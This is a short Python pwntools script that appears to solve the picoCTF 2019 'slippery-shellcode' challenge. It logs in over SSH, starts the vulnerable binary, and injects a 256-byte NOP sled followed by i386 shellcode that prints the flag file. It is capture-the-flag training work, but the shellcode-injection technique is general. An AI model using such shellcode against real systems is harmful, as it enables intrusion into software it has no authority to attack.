from os import environ
from pwn import *

EXEC = "/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/vuln"
FLAG = "/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/flag.txt"

s = ssh(
    host="2019shell1.picoctf.com",
    user=environ["PICOUSER"],
    password=environ["PICOPSWD"],
)

sh = s.process(EXEC)

shellcode = asm(shellcraft.nop() * 256 + shellcraft.i386.cat(FLAG))

sh.sendlineafter("Enter your shellcode:", shellcode)

x = sh.recvrepeat()

print(x.decode(errors="ignore"))

s.close()
